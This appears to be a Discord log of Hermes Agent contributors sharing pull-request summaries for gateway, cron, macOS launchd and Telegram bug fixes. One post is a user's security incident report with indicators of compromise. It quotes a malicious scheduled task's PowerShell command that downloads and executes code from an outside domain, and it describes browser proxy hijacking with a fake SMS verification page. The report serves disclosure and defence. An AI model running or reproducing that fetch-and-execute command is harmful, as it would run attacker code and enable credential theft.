[2026-06-08T15:11:10.602000+00:00] wittgenstein9840 (id=1513561031870513172)
    Cognitive Evidence Architecture (CEA) is a structured reasoning framework for evaluating claims under uncertainty. Instead of producing simple true/false judgments, it analyzes claims through separate layers such as conceptual clarity, logical consistency, evidence quality, causal reasoning, and domain-specific analysis. A key design principle is strict separation between explanatory domains (e.g., neuroscience, evolutionary theory, economics), preventing conclusions from one field from being incorrectly used as proof in another. The goal is to improve transparency, reduce overconfidence, and encourage more rigorous evaluation of complex claims. https://github.com/NousResearch/hermes-agent/pull/42185
    [embed] Cognitive Evidence Architecture (CEA) research skill by ibrhmuyls ... https://github.com/NousResearch/hermes-agent/pull/42185

[2026-06-08T15:44:31.100000+00:00] godsboy7777 (id=1513569422567018667)
    Hey <@387972437901312000>, when you have a gap, could you please review this?
    
    Issue: https://github.com/NousResearch/hermes-agent/issues/42187
    PR: https://github.com/NousResearch/hermes-agent/pull/42194
    
    ## Summary
    
    The new Codex `gpt-5.5` compression autoraise feature is the right behaviour.
    
    Since ChatGPT caps `gpt-5.5` at 272K tokens, raising the compaction trigger to 85% avoids wasting a lot of usable context.
    
    The issue is only the notice UX in gateway sessions.
    
    Right now the notice is effectively "once per in-memory `AIAgent`".
    
    In Telegram / WhatsApp, the visible user session can stay the same while the gateway rebuilds the agent because of:
    
    * Restart
    * Cache eviction
    * Idle expiry
    * Runtime signature change
    * Model / tool / reasoning changes
    
    That makes the same explanatory notice show again in the same conversation.
    
    The PR keeps the autoraise logic intact, but persists a small "shown once" latch per durable gateway session:
    
    * First eligible turn can still show the notice
    * Rebuilt agents for the same session suppress repeats
    * `/new`, `/reset`, auto-reset, and fresh sessions can show it once again
    * Existing session files remain backward compatible
    * CLI behaviour is unchanged
    * The opt-out remains available, but users should not need to disable the feature just to stop repeat notices
    
    CI is green.
    
    Would appreciate your eyes on whether this is the right place to persist the latch and whether the PR matches the intent of the original feature.
    [embed] fix: Show Codex gpt-5.5 autoraise notice once per gateway session ... https://github.com/NousResearch/hermes-agent/issues/42187
    [embed] fix(gateway): persist Codex autoraise notice per session by GodsBoy... https://github.com/NousResearch/hermes-agent/pull/42194

[2026-06-08T17:25:37.285000+00:00] godsboy7777 (id=1513594865991291065)
    GPT-5.4 Codex OAuth exposed a 1M window before. GPT-5.5 changed: OpenAI now documents Codex GPT-5.5 as 400K, while the 1M window is for the API route. So OAuth support changed between 5.4 and 5.5.
    
    400K is the total Codex context window for GPT-5.5. The usable input budget is lower because the window also has to reserve space for output, reasoning/tool overhead, system/developer instructions, and Codex’s own scaffolding. That’s why clients often see an effective input cap around 272K even though the advertised Codex window is 400K. Hope it makes sense
    [reply to tdamre msg=1513593388039929946]

[2026-06-08T23:26:47.072000+00:00] autonomics.build (id=1513685755665580102)
    Hey everyone. I'm trying to solve a problem and maybe someone here knows the solution. Basically I've created a specific workflow in order to prevent my Hermes agent from making mistakes and forgetting rules (everyday we ran the same workflow but it often forgets some steps, even with all the guardrails I've added). The workflow involves delegating to expert profiles and there's a validator profile that keeps checking as many times as necessary the work of agents until every condition is met. This workflow works super well when the agent uses it, problem is that it often forgets to use it. We've made it in a skill that is supposed to be loaded before any task (made mandatory in its soul) but still, it often forgets it.
    
    I was thinking that the following system would be great for improving the agent's realiability (or something along those lines): for every request to the agent, there would a deterministic process launching that calls and controls the agent and apply a quality verification workflow to it. There would be no way for the agent to avoid the workflow or answer before the workflow is complete.
    
    Is there something similar that already exists? And more generally, is there a good way to prevent the agent from forgetting rules? (I've already converted as much as I can into scripts rather than prompts).

[2026-06-08T23:46:41.068000+00:00] tbui17 (id=1513690763647520848)
    Traditionally harnesses would use todo lists that the LLM has to go through and make sure it checks off. Sometimes it's done with md files too for persistence.
    You would also mitigate forgetting (but not eliminate it) via an orchestrator pattern so that the orchestrator can keep its context window as small as possible, while delegating the majority of the work to worker agents.
    There's some more heavy handed approaches too with modifying the harness itself at the hook level to programmatically re-check or re-inject prompts.
    A key thing to note is that agents tend to be rather poor at validating their own output, so you would have a separate judge agent evaluate quality / completeness.
    [reply to autonomics.build msg=1513685755665580102]

[2026-06-08T23:56:48.335000+00:00] autonomics.build (id=1513693310710059048)
    Thanks for your answer. I have a separate judge system: a validator checks the work of the worker again and again until everything is good. Problem is the orchestrator often forgets to launch this workflow. This is frustrating because when the workflow is applied, it works really well. That's why I'm considering a more heavy handed approach.
    [reply to tbui17 msg=1513690763647520848]

[2026-06-09T00:03:12.324000+00:00] tbui17 (id=1513694921276788756)
    I would make sure "launch this workflow" is an individual item in the todo list / plan.md file, not sure what your constraints or the available hook points are, but you should be able to have programmatic checks for the presence of some item or some boolean flag between chat messages for example
    [reply to autonomics.build msg=1513693310710059048]

[2026-06-09T01:48:14.022000+00:00] frowtek (id=1513721352513785977)
    What does this PR do?
    _repair_tool_call_arguments salvages malformed tool-call JSON from
    local/quantized models. When closing unclosed structures it appended all
    missing } first, then all missing ] — a fixed order that is wrong for
    nested payloads. {"items": [1, 2 became {"items": [1, 2}] (invalid)
    instead of {"items": [1, 2]}, every later repair pass then failed, and the
    whole argument payload was silently dropped to {}. The tool then ran with
    empty arguments.
    
    The fix walks the text tracking string state (so braces/brackets inside
    string values are ignored) and closes open delimiters in LIFO nesting order,
    so nested truncations recover correctly. The flat-object case keeps working.
    
    https://github.com/NousResearch/hermes-agent/pull/42510
    [embed] fix(agent): close unclosed JSON delimiters in LIFO order when repai... https://github.com/NousResearch/hermes-agent/pull/42510

    🪲 Issue #35613: macOS gateway/launchd terminal sessions skip Homebrew PATH dirs when /usr/bin is already present. Result: read_file, search_files, patch intermittently can't find sed / rg / gh / brew etc.
    
    🔧 PR #35614: Switches from the current /usr/bin sentinel to per-entry append — adds missing _SANE_PATH entries individually, preserves user PATH order, no duplicates.

[2026-06-09T02:27:01.590000+00:00] frowtek (id=1513731115041423420)
    What does this PR do?
    GatewayStreamConsumer._split_text_chunks splits the fallback final
    message into platform-sized chunks. Its no-newline fallback hard-split at
    limit, but limit is measured in len_fn units (UTF-16 code units for
    Telegram) while it was used as a codepoint slice index. Non-BMP text
    (emoji = 2 UTF-16 units each) produced chunks up to 2x the budget,
    exceeding the platform cap — so the final fallback message was rejected
    and lost.
    
    The function already computes _cp_budget (the largest codepoint offset
    within the unit budget) and uses it to bound the newline search; the fix
    also uses it for the hard split. For the default len_fn=len,
    _cp_budget == limit, so plain-text behavior is unchanged.
    
    https://github.com/NousResearch/hermes-agent/pull/42523
    [embed] fix(gateway): respect utf16 budget in _split_text_chunks no-newline... https://github.com/NousResearch/hermes-agent/pull/42523

[2026-06-09T02:35:24.269000+00:00] kyssta69 (id=1513733223430098960)
    https://github.com/NousResearch/hermes-agent/pull/42287
    
    **Problem**: Cron jobs fail with 'PluginManager object has no attribute _middleware' during LLM API calls. The _middleware attribute was accessed directly without safety checks, and discover_plugins() was not called before cron jobs ran. Added getattr fallbacks for _middleware access and ensured plugin discovery runs before agent execution.
    
    https://github.com/NousResearch/hermes-agent/pull/42290
    
    **Problem**: Background processes on macOS silently fail because _find_shell() returns bash 3.2 instead of the user's default shell. bash 3.2 with -l flag and stdin=/dev/null swallows commands silently. Fixed by preferring $SHELL over shutil.which(bash) on macOS.
    
    https://github.com/NousResearch/hermes-agent/pull/42374
    
    **Problem**: MEDIA:/path/to/file.py tags were silently dropped because .py was not in the allowed extensions list. Added .py and other common code extensions to MEDIA_DELIVERY_EXTS so MEDIA tags with code files are matched and delivered as native attachments.
    
    https://github.com/NousResearch/hermes-agent/pull/42425
    
    **Problem**: DeepSeek API key stored via hermes auth add was ignored at runtime.
    The credential resolver extracted only the access_token and dropped the base_url from the pool entry.
    Fix: _resolve_api_key_provider_secret_and_url now returns the pool entry's base_url as a fallback.
    
    https://github.com/NousResearch/hermes-agent/pull/42426
    
    **Problem**: Docker container paths like /output/file.txt rejected by media delivery validation.
    The gateway resolve(strict=True) doesn't know about docker_volumes volume mounts.
    Fix: _resolve_via_docker_volumes translates container paths to host paths via TERMINAL_DOCKER_VOLUMES.
    
    https://github.com/NousResearch/hermes-agent/pull/42461
    
    **Problem**: When delegate_task spawns a child agent, it shares the same plugin context engine singleton as the parent, so calling update_model() on the child's engine corrupts the parent's context_length. Added deep-copy of the singleton when retrieved from get_plugin_context_engine() so each agent gets its own independent engine instance.
    
    https://github.com/NousResearch/hermes-agent/pull/42463
    
    **Problem**: Skills attached to cron jobs were not having their usage bumped when the wakeAgent=false gate fired or when the script produced empty output, causing the curator to prune actively-used skills. Added a helper that bumps usage for all job skills and call it in both early-return paths.
    
    https://github.com/NousResearch/hermes-agent/pull/42464
    
    **Problem**: The launchd plist included LimitLoadToSessionType with Aqua and Background values, which caused launchctl bootstrap to fail with exit code 5 on macOS 26. Removed the key entirely so launchd loads the service in the user's current session by default.
    https://github.com/NousResearch/hermes-agent/pull/42519
    
    **Problem**: Goal continuation breaks when session rotates to child session after compression. Background review races with goal continuation. Load_goal now walks parent_session_id chain to inherit active goals, and background review is skipped when a goal is active.
    
    https://github.com/NousResearch/hermes-agent/pull/42522
    
    **Problem**: Memory at capacity causes silent hang when agent tries replace with inexact text. Zero-match branch of replace/remove returned no previews, so agent could not self-correct and looped until turn budget exhausted. Now returns entry previews and current_entries on zero-match, letting the agent see what is stored and retry with correct text.

    https://github.com/NousResearch/hermes-agent/pull/42588
    
    **Problem**: On macOS 26, hermes gateway start/restart falls back to a detached process because launchctl kickstart -k returns exit code 5. Exit code 5 is a transient I/O error that occurs even when launchd can supervise the service. When exit 5 occurs, the code now checks if the service is loaded via launchctl list and tries launchctl start before falling back to detached, preserving launchd supervision.
    [embed] fix(gateway): try launchctl start before detached fallback on exit ... https://github.com/NousResearch/hermes-agent/pull/42588

[2026-06-09T03:57:56.278000+00:00] kyssta69 (id=1513753993661386752)
    https://github.com/NousResearch/hermes-agent/pull/42590
    
    **Problem**: On macOS 26, hermes gateway restart starts two gateway processes because launchctl kickstart -k races with KeepAlive. When kickstart kills the old process, launchd restarts it via KeepAlive while kickstart also starts a new instance. Fix: use bootout (unloads service) + bootstrap + kickstart instead of kickstart -k, preventing the KeepAlive race entirely.

    Okay, I've finally taken the time to properly address this in a thread. However, I've realized that I've fundamentally wasted my time.
    
    The cause is clear and should be obvious to anyone involved here as a "developer" who understands anything about Python.
    - Lack of core design
    
    and this permeates all three areas:
    
    - Python environment (no central management)
    - Gateway/CLI+TUI/Dashboard (no central management)
    - Within the Gateway/CLI+TUI/Dashboard (no central management)
    
    Here, various approaches are randomly used, resulting in the use of different Python environments.
    The dashboard is in conflict with the CLI/TUI and the gateway (they don't work together, but against each other).
    And even within the dashboard, CLI, or gateway, most features work against each other instead of together.
    It's a recurring theme throughout everything.
    
    The best example of this is the Kanban board in the dashboard, which has a "mass move feature."
    While this feature, if designed to accept more than one transaction, should be able to process them correctly "sequentially," it's indicative of all areas. Even this single function can't manage to avoid crashing itself.
    
    I sincerely hope you still enjoy the software, but honestly, it's a complete waste of time for me. More issues like this are added every day than there's time to fix the root cause.
    
    I simply cannot imagine that anyone here has the time or resources to implement the necessary fundamental changes in a timely manner.
    
    The only thing Hermes is currently doing for me is wasting time trying to figure out why things aren't working as they're supposed to. While they've come up with a lot of interesting ideas, that's precisely the core of the problem: too many conflicting interests that don't follow a common strategy, and therefore nothing works properly.
    
    That's why I'm doing the only sensible thing now: ending the relationship.

[2026-06-09T06:44:50.121000+00:00] godsboy7777 (id=1513795994763132970)
    Hey <@387972437901312000>, flagging a regression in gateway tool progress, with a fix ready and CI green.
    
    After updating to the latest `hermes-agent` this morning, terminal commands are leaking the full shell command into messaging chats again.
    
    On Telegram / WhatsApp / Slack and other markdown platforms, the terminal tool's progress bubble renders the entire command as a fenced code block, including the working directory, instead of the short `terminal: "..."` preview that every other tool uses.
    
    ## Short history
    
    * #41955 / #41732: reported the leak.
    * #42420: fixed it with a compact truncated preview.
    * #42576: intentionally reversed that and made the full fenced command the default on markdown platforms.
    
    So after #42576, there is no way to keep terminal progress compact on a mobile or shared channel without turning off all tool progress, which also removes the useful breadcrumbs like `search_files`, `read_file`, `patch`, and `todo`.
    
    ## Fix
    
    PR is ready and all CI is green.
    
    Instead of reverting #42576 a third time, I made it configurable per platform.
    
    New setting:
    
    ```yaml
    display:
      terminal_progress: compact
    ```
    
    Valid values:
    
    * `code_block`, default. Keeps #42576 behaviour, so nothing changes out of the box and the existing test stays green.
    * `compact`. Uses the short truncated `terminal: "..."` preview, so the full command is not posted while other breadcrumbs stay visible.
    
    It resolves through the existing per-platform display resolver, so it can be set globally or per platform, for example:
    
    ```yaml
    display:
      platforms:
        telegram:
          terminal_progress: compact
    ```
    
    It also fixes the verbose-mode path, which was serialising the full command too, and adds regression tests that drive the real command path.
    
    One reason this slipped through: the existing truncation tests call terminal progress with empty args, so they stayed green while Telegram still leaked.
    
    Issue: https://github.com/NousResearch/hermes-agent/issues/42637
    PR: https://github.com/NousResearch/hermes-agent/pull/42638
    
    Default is unchanged, so this is purely additive.
    
    Would appreciate a look when you get a sec.
    [attachment] 2026-06-09_07-47-59.jpg https://cdn.discordapp.com/attachments/1491258766648283238/1513795994922389575/2026-06-09_07-47-59.jpg?ex=6a2907e2&is=6a27b662&hm=58619a3afd6ed1e1b6ccfcc535cfa9d70ae268be6704299f480614acbc9fe214&
    [embed] [Bug]: Terminal tool progress posts the full command as a fenced co... https://github.com/NousResearch/hermes-agent/issues/42637
    [embed] feat(gateway): add per-platform terminal_progress knob to keep term... https://github.com/NousResearch/hermes-agent/pull/42638

[2026-06-09T10:44:54.610000+00:00] godsboy7777 (id=1513856411568963645)
    <@387972437901312000>, quick one for review please:
    
    I opened a fix for a Telegram gateway streaming bug where long topic replies could look like they stopped mid-answer after hitting Telegram's 4096 UTF-16 message limit.
    
    Issue:
    https://github.com/NousResearch/hermes-agent/issues/42765
    
    PR:
    https://github.com/NousResearch/hermes-agent/pull/42766
    
    Short version
    
    - Telegram streamed edits split long replies into overflow chunks.
    - If chunk 1 landed but a later continuation failed, Hermes could still treat the final response as delivered.
    - Result: the user saw a clipped answer in the topic, with no recovery tail.
    - This PR makes partial overflow delivery explicit.
    - The stream consumer then sends the missing tail instead of marking the response complete.
    - It also avoids deleting the already-visible prefix when doing the tail fallback.
    
    Validation
    
    - Local targeted gateway tests passed
    - Ruff passed
    - Full PR CI is green
    
    Main files
    
    - "gateway/platforms/telegram.py"
    - "gateway/stream_consumer.py"
    - "tests/gateway/test_telegram_overflow_partial.py"
    
    Would appreciate your review when you get a gap.
    [attachment] topic-final-response-clipped.jpg https://cdn.discordapp.com/attachments/1491258766648283238/1513856411690602619/topic-final-response-clipped.jpg?ex=6a294026&is=6a27eea6&hm=b358329b7a7b0ddd227e16e2e6abd4a87331004aee0d8d182a018aac9ca93e19&
    [embed] [Bug]: Telegram topic streamed reply can stop after first overflow ... https://github.com/NousResearch/hermes-agent/issues/42765
    [embed] fix(gateway): recover partial Telegram overflow streams by GodsBoy ... https://github.com/NousResearch/hermes-agent/pull/42766

[2026-06-09T11:01:01.513000+00:00] kyssta69 (id=1513860467053826189)
    https://github.com/NousResearch/hermes-agent/pull/42789
    
    **Problem**: Gateway does not auto-start after container restart or image upgrade because SIGTERM from Docker persists gateway_state=stopped.
    The signal handler unconditionally writes gateway_state=stopped via _update_runtime_status, and container_boot.py refuses to auto-start when state is not running.
    Skip persisting stopped state on signal-initiated shutdown so the running state survives for container_boot to auto-start on next boot.
    [embed] fix(gateway): skip persisting gateway_state=stopped on signal-initi... https://github.com/NousResearch/hermes-agent/pull/42789

[2026-06-09T11:04:28.222000+00:00] kyssta69 (id=1513861334054469793)
    https://github.com/NousResearch/hermes-agent/pull/42791
    
    **Problem**: TERMINAL_DOCKER_VOLUMES set to non-JSON value like None crashes all subprocess tools with ValueError.
    Docker env vars are parsed eagerly with json.loads regardless of terminal.backend, so a bad value kills the agent even with local backend.
    Use a safe JSON converter that falls back to the default on parse errors instead of crashing.
    [embed] fix(terminal): use safe JSON parser for docker env vars (#42725) by... https://github.com/NousResearch/hermes-agent/pull/42791

[2026-06-09T11:08:05.730000+00:00] kyssta69 (id=1513862246348881930)
    https://github.com/NousResearch/hermes-agent/pull/42795
    
    **Problem**: Curator-archived bundled skills are incorrectly flagged as user-modified, blocking updates.
    The sync code only checked user_hash != origin_hash but not whether user_hash == bundled_hash, so stale manifest entries caused false user-modified flags.
    When user copy matches current bundled version, re-baseline the manifest instead of flagging as user-modified.
    [embed] fix(skills): re-baseline manifest when user copy matches bundled (#... https://github.com/NousResearch/hermes-agent/pull/42795

[2026-06-09T11:14:17.478000+00:00] gordon4512 (id=1513863805573005312)
    I just raised this PR to fix a compaction leak into chat:
    https://github.com/NousResearch/hermes-agent/pull/42783/
    The problem seems to arise when more or less by change the compaction output lands on alternating `role="assistant"`.
    There are two possible fixes I considered:
    1) Fixing the assistant case
    2) Forcing role="user" on the compacted summary
    
    Option 2) is cleaner and has the added advantage for LLMs that weigh messages from `role="user"` higher than `role="assistant"`.
    I'm very open to input from people with better understanding of how everything else hangs together. Is this the correct fix or is there a better alternative?
    [embed] Fix memory compaction leak when role=assistant by gordan-bobic · P... https://github.com/NousResearch/hermes-agent/pull/42783/

[2026-06-09T13:49:53.406000+00:00] ilmarselter (id=1513902963293163652)
    Subject: Security incident after Hermes Desktop update on Windows 11: localhost proxy hijack and fake Google SMS verification
    
    Important context:
    - The issue appeared after installing/updating the Hermes Desktop app.
    
    Observed symptoms:
    - Chrome and Edge were both forced to a fake Google “SMS Verification” page.
    - The page appeared even when opening real-looking Google/Gmail URLs such as `https://gmail.com` and `mail.google.com`.
    - The SMS code arriving on my phone was for Wise, not Google, suggesting phishing or account-abuse behavior.
    - I did not enter the code.
    - Hermes Desktop stopped opening and did not appear in the normal Windows uninstall list.
    
    Technical findings:
    - Windows user proxy settings were repeatedly changed to localhost proxies:
      - `127.0.0.1:54556`
      - later `127.0.0.1:63706`
      - later `127.0.0.1:61946`
      - later `127.0.0.1:51858`
    - These proxies were used by both Chrome and Edge.
    - A suspicious scheduled task was found and removed:
      - `\MicrosoftSoftwareHealthCheckerLegacy`
    - The task launched PowerShell with remote code execution:
      - `powershell.exe -NoProfile -Command iex (iwr -useb quorivaspaces.info)`
      - later also observed:
      - `powershell.exe -NoProfile -Command iex (iwr -useb pinkxeltriva.com)`
    - That PowerShell process spawned:
      - `C:\WINDOWS\system32\MicrosoftSoftwareHealthCheckerLegacy\node.exe .\app.js`
    - The folder contained a bundled Node runtime and app files, including:
      - `node.exe`
      - `app.js`
      - `preload.js`
      - multiple `.node` binaries
      - `build.zip`
      - a `db` directory
    
    Indicators of compromise:
    - Domains:
      - `quorivaspaces.info`
      - `pinkxeltriva.com`
    - File path:
      - `C:\WINDOWS\system32\MicrosoftSoftwareHealthCheckerLegacy\`
    - Scheduled task:
      - `MicrosoftSoftwareHealthCheckerLegacy`
    - Behavior:
      - Forced Windows proxy to localhost
      - Intercepted browser traffic
      - Displayed fake Google SMS verification flow
      - Triggered SMS activity related to Wise

    **Problem**: Line 1: Compaction summaries were sometimes inserted with role=assistant, causing weaker LLMs to echo them back as their own previous responses.
    Line 2: The role selection logic used role=assistant when the head message was role=user, which some LLMs treated as their own prior output.
    Line 3: Always uses role=user for standalone compaction summaries and merges into adjacent messages when needed to avoid consecutive same-role.

[2026-06-09T15:36:04.275000+00:00] hughjm (id=1513929684654620672)
    Hey <@387972437901312000> , I hit this macOS gateway issue locally and opened a small fix PR here:
    
    https://github.com/NousResearch/hermes-agent/pull/42902
    
    It fixes #40831 and refs #42524. The problem I reproduced is that after #40581, Hermes gateway service operations target `user/<uid>`. That works for non-Aqua/background launchd managers, but in an interactive macOS Aqua session the LaunchAgent is loaded under `gui/<uid>`. So `hermes gateway restart` looks for `user/501/ai.hermes.gateway`, gets `Could not find service`, tries to bootstrap into `user/501`, hits `launchctl exit 5`, then falls back to a detached background process.
    
    The PR selects the domain from `launchctl managername`:
    - `Aqua` → `gui/<uid>`
    - other/unknown managers → `user/<uid>`
    
    This keeps the macOS 26 non-Aqua behavior from #40581 and restores normal launchd management for Aqua sessions. I tested it locally on macOS 26.5.1, and the PR checks are green.
    [embed] fix(gateway): select macOS launchd domain from manager by y0shua1ee... https://github.com/NousResearch/hermes-agent/pull/42902

[2026-06-09T16:31:02.061000+00:00] aleksandr_1 (id=1513943516571635783)
    **1. fix(cron): hold _jobs_file_lock in create, update, and remove.**
    `create_job`, `update_job`, and `remove_job` followed a load→modify→save pattern without holding `_jobs_file_lock`, leaving them unprotected when a gateway CRUD call on the event loop thread interleaved with a scheduler worker in the ThreadPoolExecutor. Wrapped the critical sections in all three functions with `with _jobs_file_lock:`. https://github.com/NousResearch/hermes-agent/pull/42762
    
    **2. fix(cron): warn when agent.redact fails instead of silently passing.**
    `_run_job_script` wrapped `redact_sensitive_text` in a bare `except Exception: pass` — if redaction failed, unredacted script output (API keys, tokens) flowed silently into the LLM prompt, disk storage, and chat delivery. Replaced with `except Exception as exc: logger.warning(...)` to surface the failure in logs while preserving the existing return contract. https://github.com/NousResearch/hermes-agent/pull/42877

[2026-06-09T19:25:06.312000+00:00] frowtek (id=1513987322935246980)
    What does this PR do?
    hermes logout resolves its target as
    provider_id or active_provider or _logout_default_provider_from_config().
    The config fallback only recognized nous, openai-codex, and xai-oauth.
    
    When Qwen OAuth or Google Gemini OAuth is selected via hermes model, the flow
    sets model.provider but not auth.json.active_provider (their tokens live
    outside auth.json — in the Qwen CLI credential file / Google OAuth store).
    So with no active provider, hermes logout printed
    No provider is currently logged in. and never reset model.provider.
    
    This adds qwen-oauth and google-gemini-cli to the fallback set, mirroring
    how openai-codex and xai-oauth are already handled. Both are already in
    PROVIDER_REGISTRY, so _should_reset_config_provider_on_logout resets the
    config once the target resolves — no other changes needed.
    
    https://github.com/NousResearch/hermes-agent/pull/43011
    
    
    
    What does this PR do?
    exportSession() always called getSessionMessages(sessionId) without the
    owning profile. When a session belongs to another profile — Command Center's
    all-profile list, or the sidebar under a non-active profile — the read hit the
    active gateway profile's backend instead, returning a 404 or the wrong
    transcript. getSessionMessages(id, profile?) documents that the owning profile
    must be passed for non-current/default profiles, so this forwards it — matching
    the existing renameSession/deleteSession convention.
    
    
    https://github.com/NousResearch/hermes-agent/pull/43015
    [embed] fix(cli): resolve qwen-oauth and google-gemini-cli logout from conf... https://github.com/NousResearch/hermes-agent/pull/43011
    [embed] fix(desktop): pass owning profile when exporting a session by Frowt... https://github.com/NousResearch/hermes-agent/pull/43015

[2026-06-09T19:28:53.813000+00:00] cristianmgm7 (id=1513988277143601193)
    Hey! 👋 We've built a **Carbon Voice** platform adapter for Hermes Agent (currently running as an external plugin) and we'd like to upstream it as a native platform. A few questions before we open a PR:
    
    1. **Subpackage layout** — our adapter is ~13 modules (adapter, api, parse, transport, reactions, allow-list, channels, etc.). I see `gateway/platforms/qqbot/` is already a multi-module subpackage with an `__init__.py` re-exporting the adapter — is that the pattern you'd want us to follow (`gateway/platforms/carbonvoice/`), rather than collapsing into a single file?
    
    2. **Dependencies** — Carbon Voice needs `httpx` + `python-socketio`. Should those go into core's `pyproject.toml`, or be optional/extras like some of the other platforms do?
    
    3. **Config** — env-vars-only (`CARBONVOICE_PAT`, etc.), or do you also want `config.yaml` keys wired into `load_gateway_config()`?
    
    We've already walked the `ADDING_A_PLATFORM.md` checklist and mapped all 16 integration points. Happy to share the plugin repo / a draft PR. Carbon Voice is a voice-first messaging platform (STT/TTS), so it's text-in/text-out from Hermes' side — should slot in cleanly alongside the existing adapters. 🙏

    https://github.com/NousResearch/hermes-agent/pull/43113
    
    3 small changes so skills don't land in the library orphaned:
    
        1. The curator's "new skills this run" report now includes who created each skill (created_by was already tracked internally, just never surfaced)
    
        2. New post_hook_script config – point it at a script, curator runs it after every pass. Lets you route new skills to profiles / block archivals / log audits without building your own detection pipeline. Empty by default – single-profile users see zero change.
    
        3. skill_manage gets an optional profile= param – tag which profile should own the skill at creation time, injected into the YAML frontmatter metadata.
    
        +96/-7 lines, all existing tests pass. Mechanism-only – the routing policy stays in userland.

[2026-06-09T23:00:52.280000+00:00] aleksandr_1 (id=1514041622260748562)
    **1. fix(agent): catch persist errors in finalize_turn to avoid losing turn result.**
    `finalize_turn()` called `_persist_session()` without any error handling — a disk full or SQLite lock error propagated up through `run_conversation()` with no catch, dropping the turn result and leaving the user without a response. Wrapped both `_drop_trailing_empty_response_scaffolding()` and `_persist_session()` in a single `try/except` with `logger.warning`. https://github.com/NousResearch/hermes-agent/pull/43057
    
    **2. fix(agent): normalize provider to lowercase in `_pool_may_recover_from_rate_limit`.**
    `provider == "google-gemini-cli"` is a case-sensitive comparison against a value that comes from user config or environment variables without normalization. Any case variation (Google-Gemini-CLI, GOOGLE-GEMINI-CLI) bypassed the guard, causing the credential pool to burn through its retry budget on a 429 that rotation cannot recover from instead of triggering immediate fallback. Replaced with `(provider or "").strip().lower() == "google-gemini-cli"`. https://github.com/NousResearch/hermes-agent/pull/42976

[2026-06-10T09:51:26.230000+00:00] aleksandr_1 (id=1514205342513365074)
    **feat(tools): add pre-execution argument validation layer (Phase 1, refs #522).**
    
    Between JSON parsing and tool dispatch there was no schema validation, no placeholder detection, no path existence checking, and no required parameter enforcement. Added tools/argument_validator.py with required parameter check against tool JSON schema, placeholder detection scoped to path-like parameters only, type/enum validation, and path existence check for read_file. Validation injected in agent/agent_runtime_helpers.py::invoke_tool after JSON parse, before execution, covering both sequential and concurrent paths. 13 tests added, all passing in CI. 
    
    https://github.com/NousResearch/hermes-agent/pull/43115 https://github.com/NousResearch/hermes-agent/issues/522

[2026-06-10T10:59:42.846000+00:00] kyssta69 (id=1514222524966244482)
    https://github.com/NousResearch/hermes-agent/pull/43484
    
    **Problem**: The memory tool remove action rejects valid old_text argument with 'old_text is required' error even when it is provided. The schema did not list old_text as required, so schema-aware LLMs dropped the parameter before invoking the handler. The fix adds old_text to the required fields list in the memory tool schema.

[2026-06-10T11:00:59.437000+00:00] kyssta69 (id=1514222846212182077)
    https://github.com/NousResearch/hermes-agent/pull/43486
    
    **Problem**: Feishu messages had broken Markdown formatting because _escape_markdown_text was prepending backslashes to special characters. Feishu's renderer expects raw Markdown and treats backslash-escaped sequences as literal text. The fix makes the escape function a no-op passthrough.

[2026-06-10T11:06:40.170000+00:00] kyssta69 (id=1514224275349966879)
    https://github.com/NousResearch/hermes-agent/pull/43489
    
    **Problem**: The gateway's send_message MCP tool showed 'No home channel set for telegram' even with TELEGRAM_HOME_CHANNEL configured in config.yaml and .env. The CLI path worked because it bridges config.yaml keys into os.environ, but the MCP tool path skipped this step. The fix adds the same bridging to the send_message tool.

[2026-06-10T11:06:51.562000+00:00] godsboy7777 (id=1514224323131609098)
    Hey <@387972437901312000>, fix ready for the bug mangling Hermes replies in Telegram forum topics.
    
    Long final replies come out with literal `**bold**` markers, backticks, and code fences shown as plain text.
    
    Pasting the same content by hand into the same topic renders fine, so this is our delivery path, not Telegram.
    
    PR: https://github.com/NousResearch/hermes-agent/pull/43463
    Fixes: #43441
    
    Before / after screenshots are included in both.
    
    Heads up since alt-glitch flagged #43458 and #43470 as competing fixes:
    
    Both reorder format-before-chunk in `_edit_overflow_split`, which is necessary but not sufficient.
    
    There is a second confirmed leak:
    
    The stream consumer's cancellation handler, which the gateway cancels 5s after finish, re-delivers the whole final reply with `finalize=False`.
    
    On Telegram that is plain by design, then it suppresses the formatted re-send.
    
    With chunk-ordering alone, topic finals still render raw whenever that path fires.
    
    #43463 fixes both paths.
    
    It also covers:
    
    * The inflation window, where raw text is under 4096 but formatted text goes over it, which otherwise silently degrades to stripped plain
    * A guard so the post-split re-finalize cannot duplicate chunks on screen
    
    Validation:
    
    * 19 regression tests
    * Each test was proven to fail before the fix
    * #43470 ships no tests
    * liuhao1024, who authored #43458, reviewed this PR and found no issues
    
    Scope:
    
    * Zero behavior change for streaming previews and progress messages
    * No `SendResult` changes
    * Kept out of the way of #42766
    * Interaction with #42766 is noted in the PR body
    
    All CI green on the first run.
    
    Mergeable, squash-ready.
    
    This finishes what #42421 did for progress bubbles, but for the final replies themselves.
    [attachment] user_pasted_as_is_in_same_telegram_binded_topic_2026-06-10_10-13-42.jpg https://cdn.discordapp.com/attachments/1491258766648283238/1514224323232010280/user_pasted_as_is_in_same_telegram_binded_topic_2026-06-10_10-13-42.jpg?ex=6a2a96cb&is=6a29454b&hm=fdd0183fea15afda566ab79db759ded1c2530f4d50f068aecd7e1c2ba9a67b12&
    [attachment] bot_sent_2026-06-10_10-13-11.jpg https://cdn.discordapp.com/attachments/1491258766648283238/1514224323551035514/bot_sent_2026-06-10_10-13-11.jpg?ex=6a2a96cb&is=6a29454b&hm=f3ba07995e69ba035bb8991d77ca756a9fbf89c3cbac2e927287194c87da0614&

[2026-06-10T11:42:54.558000+00:00] tianjinzhanyuzecheng_17984 (id=1514233395394121780)
    Hey <@387972437901312000>  👋
    
      Quick nudge on a Feishu channel improvement that's been up a couple of days: making bot-to-bot conversations in group chats actually work.
    
      Feishu bot-to-bot already works at ingestion (the existing FEISHU_ALLOW_BOTS=mentions opt-in admits peer-bot messages), but the conversation itself was broken: a bot only receives a group
      message that explicitly @mentions it, so a reply that omits the @ silently dies — the API returns success, the peer never sees it — while always @-ing back risks an infinite ping-pong.
      This PR closes that gap: the agent now gets the peer's open_id plus continue/stop guidance, and the model's own @ (or its deliberate absence) decides whether the exchange continues or
      ends, so loops break naturally on our side and we can never @ the wrong bot. It also fixes markdown replies rendering a leading <at> as literal text instead of a real, notifying mention.
    
      It's additive: the bot-to-bot path only activates under the existing FEISHU_ALLOW_BOTS=mentions opt-in, and the markdown mention fix is a strict improvement either way. No conflicts with
